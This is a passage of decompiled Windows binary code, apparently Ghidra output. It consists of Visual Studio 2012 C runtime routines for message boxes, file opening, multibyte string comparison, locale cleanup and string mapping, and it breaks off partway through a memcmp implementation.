  LPCWSTR local_24;
  LPCWSTR local_20;
  code *local_1c;
  code *local_18;
  undefined local_14 [8];
  byte local_c;
  uint local_8;
  
  local_8 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  local_20 = _LpText;
  iVar8 = 0;
  local_24 = _LpCaption;
  pcVar2 = (code *)EncodePointer((PVOID)0x0);
  local_1c = pcVar2;
  bVar1 = FUN_004078da();
  local_18 = (code *)CONCAT31(extraout_var,bVar1);
  if (DAT_0041bd84 == (PVOID)0x0) {
    hModule = LoadLibraryExW(u_USER32_DLL_004155c0,(HANDLE)0x0,0x800);
    if (((hModule == (HMODULE)0x0) &&
        ((DVar3 = GetLastError(), DVar3 != 0x57 ||
         (hModule = LoadLibraryW(u_USER32_DLL_004155c0), hModule == (HMODULE)0x0)))) ||
       (pFVar4 = GetProcAddress(hModule,s_MessageBoxW_004155d8), pFVar4 == (FARPROC)0x0))
    goto LAB_0041066b;
    DAT_0041bd84 = EncodePointer(pFVar4);
    pFVar4 = GetProcAddress(hModule,s_GetActiveWindow_004155e4);
    DAT_0041bd88 = (code *)EncodePointer(pFVar4);
    pFVar4 = GetProcAddress(hModule,s_GetLastActivePopup_004155f4);
    DAT_0041bd8c = (code *)EncodePointer(pFVar4);
    pFVar4 = GetProcAddress(hModule,s_GetUserObjectInformationW_00415608);
    DAT_0041bd94 = (code *)EncodePointer(pFVar4);
    pcVar2 = local_1c;
    if (DAT_0041bd94 != (code *)0x0) {
      pFVar4 = GetProcAddress(hModule,s_GetProcessWindowStation_00415624);
      DAT_0041bd90 = (code *)EncodePointer(pFVar4);
      pcVar2 = local_1c;
    }
  }
  BVar5 = IsDebuggerPresent();
  if (BVar5 == 0) {
    if (local_18 != (code *)0x0) {
      DecodePointer(DAT_0041bd84);
      goto LAB_0041066b;
    }
  }
  else {
    if (local_20 != (LPCWSTR)0x0) {
      OutputDebugStringW(local_20);
    }
    if (local_18 != (code *)0x0) goto LAB_0041066b;
  }
  if ((DAT_0041bd90 == pcVar2) || (DAT_0041bd94 == pcVar2)) {
LAB_00410621:
    if ((((DAT_0041bd88 != pcVar2) &&
         (pcVar7 = (code *)DecodePointer(DAT_0041bd88), pcVar7 != (code *)0x0)) &&
        (iVar8 = (*pcVar7)(), iVar8 != 0)) &&
       ((DAT_0041bd8c != pcVar2 &&
        (pcVar2 = (code *)DecodePointer(DAT_0041bd8c), pcVar2 != (code *)0x0)))) {
      iVar8 = (*pcVar2)(iVar8);
    }
  }
  else {
    local_18 = (code *)DecodePointer(DAT_0041bd90);
    local_1c = (code *)DecodePointer(DAT_0041bd94);
    if (((local_18 == (code *)0x0) || (local_1c == (code *)0x0)) ||
       (((iVar6 = (*local_18)(), iVar6 != 0 &&
         (iVar6 = (*local_1c)(iVar6,1,local_14,0xc,local_28), iVar6 != 0)) && ((local_c & 1) != 0)))
       ) goto LAB_00410621;
    _UType = _UType | 0x200000;
  }
  pcVar2 = (code *)DecodePointer(DAT_0041bd84);
  if (pcVar2 != (code *)0x0) {
    (*pcVar2)(iVar8,local_20,local_24,_UType);
  }
LAB_0041066b:
  iVar8 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar8;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __sopen_helper
// 
// Library: Visual Studio 2012 Release

errno_t __cdecl
__sopen_helper(char *_Filename,int _OFlag,int _ShFlag,int _PMode,int *_PFileHandle,int _BSecure)

{
  int *piVar1;
  errno_t eVar2;
  int local_20 [5];
  undefined4 uStack_c;
  undefined *local_8;
  
  local_8 = &DAT_004191b0;
  uStack_c = 0x410686;
  local_20[0] = 0;
  if (((_PFileHandle == (int *)0x0) || (*_PFileHandle = -1, _Filename == (char *)0x0)) ||
     ((_BSecure != 0 && ((_PMode & 0xfffffe7fU) != 0)))) {
    piVar1 = __errno();
    eVar2 = 0x16;
    *piVar1 = 0x16;
    FUN_00407ceb();
  }
  else {
    local_8 = (undefined *)0x0;
    eVar2 = __sopen_nolock(local_20,_PFileHandle,_Filename,_OFlag,_ShFlag,_PMode,_BSecure);
    local_8 = (undefined *)0xfffffffe;
    FUN_00410715();
    if (eVar2 != 0) {
      *_PFileHandle = -1;
    }
  }
  return eVar2;
}



void FUN_00410715(void)

{
  byte *pbVar1;
  int unaff_EBP;
  uint *unaff_ESI;
  int unaff_EDI;
  
  if (*(int *)(unaff_EBP + -0x1c) != 0) {
    if (unaff_EDI != 0) {
      pbVar1 = (byte *)((&DAT_0041b8c0)[(int)*unaff_ESI >> 5] + 4 + (*unaff_ESI & 0x1f) * 0x40);
      *pbVar1 = *pbVar1 & 0xfe;
    }
    __unlock_fhandle(*unaff_ESI);
  }
  return;
}



// Library Function - Single Match
//  __sopen_nolock
// 
// Library: Visual Studio 2012 Release

errno_t __cdecl
__sopen_nolock(int *UnlockFlag,int *_FileHandle,char *_Filename,int _OpenFlag,int _ShareFlag,
              int _PermissionFlag,int _SecureFlag)

{
  BOOL BVar1;
  int iVar2;
  LPCWSTR local_8;
  
  local_8 = (LPCWSTR)0x0;
  BVar1 = ___copy_path_to_wide_string(_Filename,&local_8);
  if (BVar1 == 0) {
    return -1;
  }
  iVar2 = FUN_0040ee7c(UnlockFlag,(WCHAR **)_FileHandle,local_8,_OpenFlag,_ShareFlag,
                       (byte)_PermissionFlag);
  FID_conflict__free(local_8);
  return iVar2;
}



// Library Function - Single Match
//  __sopen_s
// 
// Library: Visual Studio 2012 Release

errno_t __cdecl
__sopen_s(int *_FileHandle,char *_Filename,int _OpenFlag,int _ShareFlag,int _PermissionMode)

{
  errno_t eVar1;
  
  eVar1 = __sopen_helper(_Filename,_OpenFlag,_ShareFlag,_PermissionMode,_FileHandle,1);
  return eVar1;
}



// Library Function - Single Match
//  __mbsnbcmp
// 
// Library: Visual Studio 2012 Release

int __cdecl __mbsnbcmp(uchar *_Str1,uchar *_Str2,size_t _MaxCount)

{
  int iVar1;
  
  iVar1 = __mbsnbcmp_l(_Str1,_Str2,_MaxCount,(_locale_t)0x0);
  return iVar1;
}



// Library Function - Single Match
//  __mbsnbcmp_l
// 
// Library: Visual Studio 2012 Release

int __cdecl __mbsnbcmp_l(uchar *_Str1,uchar *_Str2,size_t _MaxCount,_locale_t _Locale)

{
  byte bVar1;
  byte bVar2;
  uint uVar3;
  int *piVar4;
  ushort uVar5;
  uint uVar6;
  size_t sVar7;
  byte *pbVar8;
  _LocaleUpdate local_18 [4];
  int local_14;
  int local_10;
  char local_c;
  byte *local_8;
  
  if (_MaxCount == 0) {
    uVar3 = 0;
  }
  else {
    _LocaleUpdate::_LocaleUpdate(local_18,_Locale);
    if (*(int *)(local_14 + 8) == 0) {
      uVar3 = _strncmp((char *)_Str1,(char *)_Str2,_MaxCount);
    }
    else {
      if ((_Str1 != (uchar *)0x0) && (_Str2 != (uchar *)0x0)) {
        do {
          bVar2 = *_Str1;
          sVar7 = _MaxCount - 1;
          local_8 = _Str1 + 1;
          uVar3 = 0;
          uVar6 = (uint)bVar2;
          if ((*(byte *)(bVar2 + 0x19 + local_14) & 4) == 0) {
LAB_00410878:
            uVar5 = (ushort)uVar6;
            bVar2 = *_Str2;
            pbVar8 = _Str2 + 1;
            uVar6 = (uint)bVar2;
            if (((*(byte *)(bVar2 + 0x19 + local_14) & 4) != 0) && (uVar6 = 0, sVar7 != 0)) {
              bVar1 = *pbVar8;
              sVar7 = _MaxCount - 2;
              if (bVar1 != 0) {
                pbVar8 = _Str2 + 2;
                uVar6 = (uint)CONCAT11(bVar2,bVar1);
              }
            }
          }
          else {
            if (sVar7 != 0) {
              bVar1 = *local_8;
              uVar6 = uVar3;
              if (bVar1 != 0) {
                local_8 = _Str1 + 2;
                uVar6 = (uint)CONCAT11(bVar2,bVar1);
              }
              goto LAB_00410878;
            }
            uVar5 = 0;
            if ((*(byte *)(*_Str2 + 0x19 + local_14) & 4) != 0) goto LAB_004108c4;
            uVar6 = (uint)*_Str2;
            pbVar8 = _Str2;
          }
          uVar3 = 0;
          if ((ushort)uVar6 != uVar5) {
            uVar3 = (-(uint)((ushort)uVar6 < uVar5) & 2) - 1;
            goto LAB_004108c4;
          }
          if ((uVar5 == 0) || (_Str1 = local_8, _MaxCount = sVar7, _Str2 = pbVar8, sVar7 == 0))
          goto LAB_004108c4;
        } while( true );
      }
      piVar4 = __errno();
      *piVar4 = 0x16;
      FUN_00407ceb();
      uVar3 = 0x7fffffff;
    }
LAB_004108c4:
    if (local_c != '\0') {
      *(uint *)(local_10 + 0x70) = *(uint *)(local_10 + 0x70) & 0xfffffffd;
    }
  }
  return uVar3;
}



// Library Function - Single Match
//  __mbsnbicmp
// 
// Library: Visual Studio 2012 Release

int __cdecl __mbsnbicmp(uchar *_Str1,uchar *_Str2,size_t _MaxCount)

{
  int iVar1;
  
  iVar1 = __mbsnbicmp_l(_Str1,_Str2,_MaxCount,(_locale_t)0x0);
  return iVar1;
}



// Library Function - Single Match
//  __mbsnbicmp_l
// 
// Library: Visual Studio 2012 Release

int __cdecl __mbsnbicmp_l(uchar *_Str1,uchar *_Str2,size_t _MaxCount,_locale_t _Locale)

{
  ushort uVar1;
  byte bVar2;
  int *piVar3;
  uint uVar4;
  int iVar5;
  byte *pbVar6;
  ushort uVar7;
  size_t sVar8;
  _LocaleUpdate local_1c [4];
  int local_18;
  int local_14;
  char local_10;
  byte *local_c;
  size_t local_8;
  
  _LocaleUpdate::_LocaleUpdate(local_1c,_Locale);
  iVar5 = 0;
  if (_MaxCount != 0) {
    if (*(int *)(local_18 + 8) == 0) {
      iVar5 = __strnicmp((char *)_Str1,(char *)_Str2,_MaxCount);
    }
    else {
      if ((_Str1 != (uchar *)0x0) && (_Str2 != (uchar *)0x0)) {
        do {
          iVar5 = 0;
          bVar2 = *_Str1;
          uVar4 = (uint)bVar2;
          sVar8 = _MaxCount - 1;
          local_c = _Str1 + 1;
          if ((*(byte *)(uVar4 + 0x19 + local_18) & 4) == 0) {
            local_8._0_2_ = (ushort)bVar2;
            uVar7 = (ushort)local_8;
            if ((*(byte *)(uVar4 + 0x19 + local_18) & 0x10) != 0) {
              local_8._0_2_ = (ushort)*(byte *)(uVar4 + 0x119 + local_18);
              uVar7 = (ushort)local_8;
            }
LAB_004109f8:
            local_8 = (size_t)*_Str2;
            pbVar6 = _Str2 + 1;
            if ((*(byte *)(local_8 + 0x19 + local_18) & 4) == 0) {
              if ((*(byte *)(local_8 + 0x19 + local_18) & 0x10) != 0) {
                bVar2 = *(byte *)(local_8 + 0x119 + local_18);
                goto LAB_00410a74;
              }
            }
            else {
              if (sVar8 != 0) {
                sVar8 = _MaxCount - 2;
                if (*pbVar6 != 0) {
                  uVar1 = CONCAT11(*_Str2,*pbVar6);
                  local_8 = (size_t)uVar1;
                  pbVar6 = _Str2 + 2;
                  if ((uVar1 < *(ushort *)(local_18 + 0xc)) || (*(ushort *)(local_18 + 0xe) < uVar1)
                     ) {
                    if ((*(ushort *)(local_18 + 0x12) <= uVar1) &&
                       (uVar1 <= *(ushort *)(local_18 + 0x14))) {
                      local_8 = (size_t)(ushort)(uVar1 + *(short *)(local_18 + 0x16));
                    }
                  }
                  else {
                    local_8 = (size_t)(ushort)(uVar1 + *(short *)(local_18 + 0x10));
                  }
                  goto LAB_00410a7b;
                }
              }
              _MaxCount = 0;
              local_8 = _MaxCount;
            }
          }
          else {
            if (sVar8 != 0) {
              if (*local_c == 0) {
                local_8._0_2_ = 0;
                uVar7 = (ushort)local_8;
              }
              else {
                uVar7 = CONCAT11(bVar2,*local_c);
                local_c = _Str1 + 2;
                if ((uVar7 < *(ushort *)(local_18 + 0xc)) || (*(ushort *)(local_18 + 0xe) < uVar7))
                {
                  if ((*(ushort *)(local_18 + 0x12) <= uVar7) &&
                     (uVar7 <= *(ushort *)(local_18 + 0x14))) {
                    uVar7 = uVar7 + *(short *)(local_18 + 0x16);
                  }
                }
                else {
                  uVar7 = uVar7 + *(short *)(local_18 + 0x10);
                }
              }
              goto LAB_004109f8;
            }
            if ((*(byte *)(*_Str2 + 0x19 + local_18) & 4) != 0) goto LAB_00410a98;
            bVar2 = *_Str2;
            uVar7 = 0;
            pbVar6 = _Str2;
LAB_00410a74:
            local_8 = (size_t)bVar2;
          }
LAB_00410a7b:
          iVar5 = 0;
          if ((ushort)local_8 != uVar7) {
            iVar5 = (-(uint)((ushort)local_8 < uVar7) & 2) - 1;
            goto LAB_00410a98;
          }
          if ((uVar7 == 0) || (_Str2 = pbVar6, _Str1 = local_c, _MaxCount = sVar8, sVar8 == 0))
          goto LAB_00410a98;
        } while( true );
      }
      piVar3 = __errno();
      *piVar3 = 0x16;
      FUN_00407ceb();
      iVar5 = 0x7fffffff;
    }
  }
LAB_00410a98:
  if (local_10 != '\0') {
    *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
  }
  return iVar5;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  private: static void __cdecl type_info::_Type_info_dtor(class type_info *)
// 
// Library: Visual Studio 2012 Release

void __cdecl type_info::_Type_info_dtor(type_info *param_1)

{
  int *_Memory;
  int *piVar1;
  int *piVar2;
  
  __lock(0xe);
  _Memory = DAT_0041bd9c;
  if (*(int *)(param_1 + 4) != 0) {
    piVar1 = (int *)&DAT_0041bd98;
    do {
      piVar2 = piVar1;
      if (DAT_0041bd9c == (int *)0x0) goto LAB_00410b81;
      piVar1 = DAT_0041bd9c;
    } while (*DAT_0041bd9c != *(int *)(param_1 + 4));
    piVar2[1] = DAT_0041bd9c[1];
    FID_conflict__free(_Memory);
LAB_00410b81:
    FID_conflict__free(*(void **)(param_1 + 4));
    *(undefined4 *)(param_1 + 4) = 0;
  }
  FUN_00410ba4();
  return;
}



void FUN_00410ba4(void)

{
  FUN_0040ed0f(0xe);
  return;
}



// Library Function - Single Match
//  ___free_lconv_mon
// 
// Library: Visual Studio 2012 Release

void __cdecl ___free_lconv_mon(int param_1)

{
  if (param_1 != 0) {
    if (*(undefined **)(param_1 + 0xc) != PTR_DAT_0041ae94) {
      FID_conflict__free(*(undefined **)(param_1 + 0xc));
    }
    if (*(undefined **)(param_1 + 0x10) != PTR_DAT_0041ae98) {
      FID_conflict__free(*(undefined **)(param_1 + 0x10));
    }
    if (*(undefined **)(param_1 + 0x14) != PTR_DAT_0041ae9c) {
      FID_conflict__free(*(undefined **)(param_1 + 0x14));
    }
    if (*(undefined **)(param_1 + 0x18) != PTR_DAT_0041aea0) {
      FID_conflict__free(*(undefined **)(param_1 + 0x18));
    }
    if (*(undefined **)(param_1 + 0x1c) != PTR_DAT_0041aea4) {
      FID_conflict__free(*(undefined **)(param_1 + 0x1c));
    }
    if (*(undefined **)(param_1 + 0x20) != PTR_DAT_0041aea8) {
      FID_conflict__free(*(undefined **)(param_1 + 0x20));
    }
    if (*(undefined **)(param_1 + 0x24) != PTR_DAT_0041aeac) {
      FID_conflict__free(*(undefined **)(param_1 + 0x24));
    }
    if (*(undefined **)(param_1 + 0x38) != PTR_DAT_0041aec0) {
      FID_conflict__free(*(undefined **)(param_1 + 0x38));
    }
    if (*(undefined **)(param_1 + 0x3c) != PTR_DAT_0041aec4) {
      FID_conflict__free(*(undefined **)(param_1 + 0x3c));
    }
    if (*(undefined **)(param_1 + 0x40) != PTR_DAT_0041aec8) {
      FID_conflict__free(*(undefined **)(param_1 + 0x40));
    }
    if (*(undefined **)(param_1 + 0x44) != PTR_DAT_0041aecc) {
      FID_conflict__free(*(undefined **)(param_1 + 0x44));
    }
    if (*(undefined **)(param_1 + 0x48) != PTR_DAT_0041aed0) {
      FID_conflict__free(*(undefined **)(param_1 + 0x48));
    }
    if (*(undefined **)(param_1 + 0x4c) != PTR_DAT_0041aed4) {
      FID_conflict__free(*(undefined **)(param_1 + 0x4c));
    }
  }
  return;
}



// Library Function - Single Match
//  ___free_lconv_num
// 
// Library: Visual Studio 2012 Release

void __cdecl ___free_lconv_num(void **param_1)

{
  if (param_1 != (void **)0x0) {
    if ((undefined *)*param_1 != PTR_DAT_0041ae88) {
      FID_conflict__free(*param_1);
    }
    if ((undefined *)param_1[1] != PTR_DAT_0041ae8c) {
      FID_conflict__free(param_1[1]);
    }
    if ((undefined *)param_1[2] != PTR_DAT_0041ae90) {
      FID_conflict__free(param_1[2]);
    }
    if ((undefined *)param_1[0xc] != PTR_DAT_0041aeb8) {
      FID_conflict__free(param_1[0xc]);
    }
    if ((undefined *)param_1[0xd] != PTR_DAT_0041aebc) {
      FID_conflict__free(param_1[0xd]);
    }
  }
  return;
}



// Library Function - Single Match
//  ___free_lc_time
// 
// Library: Visual Studio 2012 Release

void __cdecl ___free_lc_time(void **param_1)

{
  if (param_1 != (void **)0x0) {
    FID_conflict__free(param_1[1]);
    FID_conflict__free(param_1[2]);
    FID_conflict__free(param_1[3]);
    FID_conflict__free(param_1[4]);
    FID_conflict__free(param_1[5]);
    FID_conflict__free(param_1[6]);
    FID_conflict__free(*param_1);
    FID_conflict__free(param_1[8]);
    FID_conflict__free(param_1[9]);
    FID_conflict__free(param_1[10]);
    FID_conflict__free(param_1[0xb]);
    FID_conflict__free(param_1[0xc]);
    FID_conflict__free(param_1[0xd]);
    FID_conflict__free(param_1[7]);
    FID_conflict__free(param_1[0xe]);
    FID_conflict__free(param_1[0xf]);
    FID_conflict__free(param_1[0x10]);
    FID_conflict__free(param_1[0x11]);
    FID_conflict__free(param_1[0x12]);
    FID_conflict__free(param_1[0x13]);
    FID_conflict__free(param_1[0x14]);
    FID_conflict__free(param_1[0x15]);
    FID_conflict__free(param_1[0x16]);
    FID_conflict__free(param_1[0x17]);
    FID_conflict__free(param_1[0x18]);
    FID_conflict__free(param_1[0x19]);
    FID_conflict__free(param_1[0x1a]);
    FID_conflict__free(param_1[0x1b]);
    FID_conflict__free(param_1[0x1c]);
    FID_conflict__free(param_1[0x1d]);
    FID_conflict__free(param_1[0x1e]);
    FID_conflict__free(param_1[0x1f]);
    FID_conflict__free(param_1[0x20]);
    FID_conflict__free(param_1[0x21]);
    FID_conflict__free(param_1[0x22]);
    FID_conflict__free(param_1[0x23]);
    FID_conflict__free(param_1[0x24]);
    FID_conflict__free(param_1[0x25]);
    FID_conflict__free(param_1[0x26]);
    FID_conflict__free(param_1[0x27]);
    FID_conflict__free(param_1[0x28]);
    FID_conflict__free(param_1[0x29]);
    FID_conflict__free(param_1[0x2a]);
    FID_conflict__free(param_1[0x2e]);
    FID_conflict__free(param_1[0x2f]);
    FID_conflict__free(param_1[0x30]);
    FID_conflict__free(param_1[0x31]);
    FID_conflict__free(param_1[0x32]);
    FID_conflict__free(param_1[0x33]);
    FID_conflict__free(param_1[0x2d]);
    FID_conflict__free(param_1[0x35]);
    FID_conflict__free(param_1[0x36]);
    FID_conflict__free(param_1[0x37]);
    FID_conflict__free(param_1[0x38]);
    FID_conflict__free(param_1[0x39]);
    FID_conflict__free(param_1[0x3a]);
    FID_conflict__free(param_1[0x34]);
    FID_conflict__free(param_1[0x3b]);
    FID_conflict__free(param_1[0x3c]);
    FID_conflict__free(param_1[0x3d]);
    FID_conflict__free(param_1[0x3e]);
    FID_conflict__free(param_1[0x3f]);
    FID_conflict__free(param_1[0x40]);
    FID_conflict__free(param_1[0x41]);
    FID_conflict__free(param_1[0x42]);
    FID_conflict__free(param_1[0x43]);
    FID_conflict__free(param_1[0x44]);
    FID_conflict__free(param_1[0x45]);
    FID_conflict__free(param_1[0x46]);
    FID_conflict__free(param_1[0x47]);
    FID_conflict__free(param_1[0x48]);
    FID_conflict__free(param_1[0x49]);
    FID_conflict__free(param_1[0x4a]);
    FID_conflict__free(param_1[0x4b]);
    FID_conflict__free(param_1[0x4c]);
    FID_conflict__free(param_1[0x4d]);
    FID_conflict__free(param_1[0x4e]);
    FID_conflict__free(param_1[0x4f]);
    FID_conflict__free(param_1[0x50]);
    FID_conflict__free(param_1[0x51]);
    FID_conflict__free(param_1[0x52]);
    FID_conflict__free(param_1[0x53]);
    FID_conflict__free(param_1[0x54]);
    FID_conflict__free(param_1[0x55]);
    FID_conflict__free(param_1[0x56]);
    FID_conflict__free(param_1[0x57]);
    FID_conflict__free(param_1[0x58]);
  }
  return;
}



// WARNING: Function: __alloca_probe_16 replaced with injection: alloca_probe
// Library Function - Single Match
//  int __cdecl __crtLCMapStringA_stat(struct localeinfo_struct *,wchar_t const *,unsigned long,char
// const *,int,char *,int,int,int)
// 
// Library: Visual Studio 2012 Release

int __cdecl
__crtLCMapStringA_stat
          (localeinfo_struct *param_1,wchar_t *param_2,ulong param_3,char *param_4,int param_5,
          char *param_6,int param_7,int param_8,int param_9)

{
  uint _Size;
  uint uVar1;
  char *pcVar2;
  int iVar3;
  uint cchWideChar;
  undefined4 *lpWideCharStr;
  uint uVar4;
  undefined4 *puVar5;
  int iVar6;
  
  uVar1 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  pcVar2 = param_4;
  iVar6 = param_5;
  if (0 < param_5) {
    do {
      iVar6 = iVar6 + -1;
      if (*pcVar2 == '\0') goto LAB_004110bc;
      pcVar2 = pcVar2 + 1;
    } while (iVar6 != 0);
    iVar6 = -1;
LAB_004110bc:
    iVar3 = (param_5 - iVar6) + -1;
    iVar6 = param_5 - iVar6;
    if (param_5 <= iVar3) {
      iVar6 = iVar3;
    }
  }
  if (param_8 == 0) {
    param_8 = param_1->locinfo->lc_codepage;
  }
  cchWideChar = MultiByteToWideChar(param_8,(uint)(param_9 != 0) * 8 + 1,param_4,iVar6,(LPWSTR)0x0,0
                                   );
  if (cchWideChar == 0) goto LAB_00411267;
  if (((int)cchWideChar < 1) || (0xffffffe0 / cchWideChar < 2)) {
    lpWideCharStr = (undefined4 *)0x0;
  }
  else {
    uVar4 = cchWideChar * 2 + 8;
    if (uVar4 < 0x401) {
      puVar5 = (undefined4 *)&stack0xffffffe8;
      lpWideCharStr = (undefined4 *)&stack0xffffffe8;
      if (&stack0x00000000 != (undefined *)0x18) {
LAB_00411154:
        lpWideCharStr = puVar5 + 2;
      }
    }
    else {
      lpWideCharStr = (undefined4 *)_malloc(uVar4);
      if (lpWideCharStr != (undefined4 *)0x0) {
        *lpWideCharStr = 0xdddd;
        puVar5 = lpWideCharStr;
        goto LAB_00411154;
      }
    }
  }
  if (lpWideCharStr == (undefined4 *)0x0) goto LAB_00411267;
  iVar6 = MultiByteToWideChar(param_8,1,param_4,iVar6,(LPWSTR)lpWideCharStr,cchWideChar);
  if ((iVar6 != 0) &&
     (uVar4 = FUN_00412c14(param_2,param_3,(LPCWSTR)lpWideCharStr,cchWideChar,(LPWSTR)0x0,0),
     uVar4 != 0)) {
    if ((param_3 & 0x400) == 0) {
      if (((int)uVar4 < 1) || (0xffffffe0 / uVar4 < 2)) {
        puVar5 = (undefined4 *)0x0;
LAB_0041121a:
        if (puVar5 != (undefined4 *)0x0) {
          iVar6 = FUN_00412c14(param_2,param_3,(LPCWSTR)lpWideCharStr,cchWideChar,(LPWSTR)puVar5,
                               uVar4);
          if (iVar6 != 0) {
            if (param_7 == 0) {
              param_7 = 0;
              param_6 = (LPSTR)0x0;
            }
            WideCharToMultiByte(param_8,0,(LPCWSTR)puVar5,uVar4,param_6,param_7,(LPCSTR)0x0,
                                (LPBOOL)0x0);
          }
          __freea(puVar5);
        }
      }
      else {
        _Size = uVar4 * 2 + 8;
        if (_Size < 0x401) {
          puVar5 = (undefined4 *)&stack0xffffffe8;
          if (&stack0x00000000 != (undefined *)0x18) {
LAB_00411213:
            puVar5 = puVar5 + 2;
            goto LAB_0041121a;
          }
        }
        else {
          puVar5 = (undefined4 *)_malloc(_Size);
          if (puVar5 != (undefined4 *)0x0) {
            *puVar5 = 0xdddd;
            goto LAB_00411213;
          }
        }
      }
    }
    else if ((param_7 != 0) && ((int)uVar4 <= param_7)) {
      FUN_00412c14(param_2,param_3,(LPCWSTR)lpWideCharStr,cchWideChar,(LPWSTR)param_6,param_7);
    }
  }
  __freea(lpWideCharStr);
LAB_00411267:
  iVar6 = ___security_check_cookie_4(uVar1 ^ (uint)&stack0xfffffffc);
  return iVar6;
}



// Library Function - Single Match
//  ___crtLCMapStringA
// 
// Library: Visual Studio 2012 Release

int __cdecl
___crtLCMapStringA(_locale_t _Plocinfo,LPCWSTR _LocaleName,DWORD _DwMapFlag,LPCSTR _LpSrcStr,
                  int _CchSrc,LPSTR _LpDestStr,int _CchDest,int _Code_page,BOOL _BError)

{
  int iVar1;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Plocinfo);
  iVar1 = __crtLCMapStringA_stat
                    (&local_14,_LocaleName,_DwMapFlag,_LpSrcStr,_CchSrc,_LpDestStr,_CchDest,
                     _Code_page,_BError);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return iVar1;
}



// Library Function - Single Match
//  __freea
// 
// Library: Visual Studio 2012 Release

void __cdecl __freea(void *_Memory)

{
  if ((_Memory != (void *)0x0) && (*(int *)((int)_Memory + -8) == 0xdddd)) {
    FID_conflict__free((int *)((int)_Memory + -8));
  }
  return;
}



// WARNING: Function: __alloca_probe_16 replaced with injection: alloca_probe
// Library Function - Single Match
//  int __cdecl __crtGetStringTypeA_stat(struct localeinfo_struct *,unsigned long,char const
// *,int,unsigned short *,int,int)
// 
// Library: Visual Studio 2012 Release

int __cdecl
__crtGetStringTypeA_stat
          (localeinfo_struct *param_1,ulong param_2,char *param_3,int param_4,ushort *param_5,
          int param_6,int param_7)

{
  uint _Size;
  uint uVar1;
  uint cchWideChar;
  undefined4 *puVar2;
  int iVar3;
  uint *lpWideCharStr;
  
  uVar1 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  if (param_6 == 0) {
    param_6 = param_1->locinfo->lc_codepage;
  }
  cchWideChar = MultiByteToWideChar(param_6,(uint)(param_7 != 0) * 8 + 1,param_3,param_4,(LPWSTR)0x0
                                    ,0);
  if (cchWideChar == 0) goto LAB_004113b5;
  if (((int)cchWideChar < 1) || (0x7ffffff0 < cchWideChar)) {
    lpWideCharStr = (uint *)0x0;
  }
  else {
    _Size = cchWideChar * 2 + 8;
    if (_Size < 0x401) {
      puVar2 = (undefined4 *)&stack0xffffffec;
      if (&stack0x00000000 == (undefined *)0x14) goto LAB_004113b5;
    }
    else {
      puVar2 = (undefined4 *)_malloc(_Size);
      if (puVar2 == (undefined4 *)0x0) goto LAB_004113b5;
      *puVar2 = 0xdddd;
    }
    lpWideCharStr = puVar2 + 2;
  }
  if (lpWideCharStr != (uint *)0x0) {
    FUN_00409600(lpWideCharStr,0,cchWideChar * 2);
    iVar3 = MultiByteToWideChar(param_6,1,param_3,param_4,(LPWSTR)lpWideCharStr,cchWideChar);
    if (iVar3 != 0) {
      GetStringTypeW(param_2,(LPCWSTR)lpWideCharStr,iVar3,param_5);
    }
    __freea(lpWideCharStr);
  }
LAB_004113b5:
  iVar3 = ___security_check_cookie_4(uVar1 ^ (uint)&stack0xfffffffc);
  return iVar3;
}



// Library Function - Single Match
//  ___crtGetStringTypeA
// 
// Library: Visual Studio 2012 Release

BOOL __cdecl
___crtGetStringTypeA
          (_locale_t _Plocinfo,DWORD _DWInfoType,LPCSTR _LpSrcStr,int _CchSrc,LPWORD _LpCharType,
          int _Code_page,BOOL _BError)

{
  int iVar1;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Plocinfo);
  iVar1 = __crtGetStringTypeA_stat
                    (&local_14,_DWInfoType,_LpSrcStr,_CchSrc,_LpCharType,_Code_page,_BError);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return iVar1;
}



// Library Function - Single Match
//  _memcmp
// 
// Library: Visual Studio 2012 Release

int __cdecl _memcmp(void *_Buf1,void *_Buf2,size_t _Size)

{
  uint uVar1;
  int iVar2;
  uint uVar3;
  
  if (_Size == 0) {
    return 0;
  }
  if (_Size == 1) {
                    // WARNING: Load size is inaccurate
    uVar3 = (uint)*_Buf1;
                    // WARNING: Load size is inaccurate
    uVar1 = (uint)*_Buf2;
LAB_00412a51:
    if (uVar3 == uVar1) {
      return 0;
    }
    return (uint)(0 < (int)(uVar3 - uVar1)) * 2 + -1;
  }
  if (_Size == 2) {
                    // WARNING: Load size is inaccurate
    uVar3 = (uint)*_Buf1;
                    // WARNING: Load size is inaccurate
    uVar1 = (uint)*_Buf2;
    if ((uVar3 != uVar1) &&
       (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
      return iVar2;
    }
    uVar3 = (uint)*(byte *)((int)_Buf1 + 1);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 1);
    goto LAB_00412a51;
  }
  if (_Size == 3) {
                    // WARNING: Load size is inaccurate
    uVar3 = (uint)*_Buf1;
                    // WARNING: Load size is inaccurate
    uVar1 = (uint)*_Buf2;
    if ((uVar3 != uVar1) &&
       (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
      return iVar2;
    }
    uVar3 = (uint)*(byte *)((int)_Buf1 + 1);
    uVar1 = (uint)*(byte *)((int)_Buf2 + 1);
    if ((uVar3 != uVar1) &&
       (iVar2 = (uint)(uVar3 != uVar1 && -1 < (int)(uVar3 - uVar1)) * 2 + -1, iVar2 != 0)) {
      return iVar2;
    }
